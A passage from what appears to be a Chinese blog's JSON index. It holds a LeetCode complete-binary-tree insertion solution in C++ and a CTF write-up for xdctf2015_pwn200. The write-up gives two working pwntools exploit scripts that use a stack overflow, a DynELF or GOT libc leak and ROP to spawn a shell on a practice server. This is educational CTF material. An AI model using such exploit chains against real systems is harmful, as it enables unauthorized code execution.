使用队列完成二叉树的层序遍历通过观察可以发现新节点需要插入层次遍历时第一个出现的 “不完整的节点” （即不同时具有左右孩子节点）。如图中所示，绿色代表当前队列中的节点（规定节点的左右孩子均存在时才将它们一起先后压入队列)，当遍历到 “不完整的节点” 就找到了新节点插入的节点位置，“不完整的节点” 位于队列的头部。在 CBTInserter 函数中实现该过程，找到插入的位置，以及得到当前的队列。 插入操作时，先后检查队列头部节点的左右孩子，若左孩子缺失则将新节点插入其左孩子，右孩子缺失则插入右孩子。当队列头部节点的左右孩子都存在，则将其左右孩子压入队列尾部，队列的头部节点出队列，因为此时它已不是 “不完整的节点” 。更新后的队列的头部节点将是下一个 “不完整的节点”。按照规则依次处理接下来的插入操作。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253/** * Definition for a binary tree node. * struct TreeNode { * int val; * TreeNode *left; * TreeNode *right; * TreeNode() : val(0), left(nullptr), right(nullptr) {} * TreeNode(int x) : val(x), left(nullptr), right(nullptr) {} * TreeNode(int x, TreeNode *left, TreeNode *right) : val(x), left(left), right(right) {} * }; */class CBTInserter {private: queue&lt;TreeNode*&gt; que; TreeNode* root;public: CBTInserter(TreeNode* root) { this-&gt;root = root; que.push(root); while (que.front()-&gt;left != nullptr &amp;&amp; que.front()-&gt;right != nullptr) { que.push(que.front()-&gt;left); que.push(que.front()-&gt;right); que.pop(); } } int insert(int v) { TreeNode* node = new TreeNode(v); TreeNode* fa = que.front(); if (fa-&gt;left == nullptr) { fa-&gt;left = node; } else { fa-&gt;right = node; que.push(fa-&gt;left); que.push(fa-&gt;right); que.pop(); } return fa-&gt;val; } TreeNode* get_root() { return this-&gt;root; }};/** * Your CBTInserter object will be instantiated and called as such: * CBTInserter* obj = new CBTInserter(root); * int param_1 = obj-&gt;insert(v); * TreeNode* param_2 = obj-&gt;get_root(); */ 时间复杂度为 O(n)，队列中存的节点数为 O(n)，所以空间复杂度为 O(n)。","link":"/2022/01/30/leetcode%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C%EF%BC%89/"},{"title":"xdctf2015_pwn200","text":"DynELF使用 程序分析程序检查：32位程序 主函数：vul中存在栈溢出 关于DynELF​ 在做漏洞利用时，由于 ASLR 的影响，我们在获取某些函数地址的时候，需要一些特殊的操作。一种方法是先泄露出 libc.so 中的某个函数，然后根据函数之间的偏移，计算得到我们需要的函数地址，这种方法的局限性在于我们需要能找到和目标服务器上一样的 libc.so，而有些特殊情况下往往并不能找到。而另一种方法，利用如 pwntools 的 DynELF 模块，对内存进行搜索，直接得到我们需要的函数地址。 ​ 官方文档里给出了下面的例子： 123456789101112131415161718192021222324252627282930313233343536# Assume a process or remote connectionp = process('./pwnme')# Declare a function that takes a single address, and# leaks at least one byte at that address.def leak(address): data = p.read(address, 4) log.debug(&quot;%#x =&gt; %s&quot; % (address, (data or '').encode('hex'))) return data# For the sake of this example, let's say that we# have any of these pointers. One is a pointer into# the target binary, the other two are pointers into libcmain = 0xfeedf4celibc = 0xdeadb000system = 0xdeadbeef# With our leaker, and a pointer into our target binary,# we can resolve the address of anything.## We do not actually need to have a copy of the target# binary for this to work.d = DynELF(leak, main)assert d.lookup(None, 'libc') == libcassert d.lookup('system', 'libc') == system# However, if we *do* have a copy of the target binary,# we can speed up some of the steps.d = DynELF(leak, main, elf=ELF('./pwnme'))assert d.lookup(None, 'libc') == libcassert d.lookup('system', 'libc') == system# Alternately, we can resolve symbols inside another library,# given a pointer into it.d = DynELF(leak, libc + 0x1234)assert d.lookup('system') == system 可以看到，为了使用 DynELF，首先需要有一个 leak(address) 函数，通过这一函数可以获取到某个地址上最少 1 byte 的数据，然后将这个函数作为参数调用 d = DynELF(leak, main)，该模块就初始化完成了，然后就可以使用它提供的函数进行内存搜索，得到我们需要的函数地址。 漏洞利用第一次栈溢出write函数泄露libc地址，返回main函数，使用DynELF查找system地址写入/bin/sh，再次rop执行拿到shell EXP12345678910111213141516171819202122232425262728from pwn import *r=remote('node4.buuoj.cn',25224)# r= process('./bof')elf=ELF('./bof')read_addr=elf.symbols['read']write_addr=elf.symbols['write']main_addr=0x804851cbss_addr=elf.symbols['__bss_start'] def leak(addr): //write函数泄露libc地址 r.recvline() payload='a'*0x6c+'b'*0x4+p32(write_addr)+p32(main_addr)+p32(1)+p32(addr)+p32(0x4) r.sendline(payload) leak_addr=r.recv(4) return leak_addrd=DynELF(leak,elf=ELF('./bof'))system_addr=d.lookup('system','libc')payload='a'*0x6c+'b'*0x4+p32(read_addr)+p32(main_addr)+p32(0x0)+p32(bss_addr)+p32(0x8)r.sendline(payload)r.sendline('/bin/sh') # 通过read函数读入/bin/sh到bss段payload='a'*0x6c+'b'*0x4+p32(system_addr)+p32(main_addr)+p32(bss_addr)r.sendline(payload)r.interactive() 法二 : ret2dl-resolve 1234567891011121314151617181920212223242526272829303132333435#coding=UTF-8from pwn import *context.log_level = 'debug'sh = remote('node4.buuoj.cn',25224)elf = ELF('bof')libc = ELF('./libc-2.23x86.so')payload = 112 * 'a'payload += p32(elf.plt['write'])payload += p32(elf.symbols['main'])payload += p32(1)payload += p32(elf.got['write'])payload += p32(4)sh.sendline(payload)write_addr = u32(sh.recvuntil('\\xf7')[-4:]) #获取write函数地址print hex(write_addr)libcbase = write_addr - libc.symbols['write']system = libcbase + libc.symbols['system']binsh = libcbase + libc.search('/bin/sh').next()payload = 112 * 'a'payload += p32(system)payload += p32(0xdeadbeef)payload += p32(binsh)sh.sendline(payload)sh.interactive() 参考文章https://firmianay.gitbooks.io/ctf-all-in-one/content/doc/4.8_dynelf.html","link":"/2022/02/01/xdctf2015_pwn200/"}],"tags":[{"name":"随笔","slug":"随笔","link":"/tags/%E9%9A%8F%E7%AC%94/"},{"name":"pwn","slug":"pwn","link":"/tags/pwn/"},{"name":"leetcode","slug":"leetcode","link":"/tags/leetcode/"}],"categories":[{"name":"pwn","slug":"pwn","link":"/categories/pwn/"},{"name":"随笔","slug":"随笔","link":"/categories/%E9%9A%8F%E7%AC%94/"},{"name":"leetcode","slug":"leetcode","link":"/categories/leetcode/"},{"name":"pwnable.tw","slug":"pwnable-tw","link":"/categories/pwnable-tw/"}]}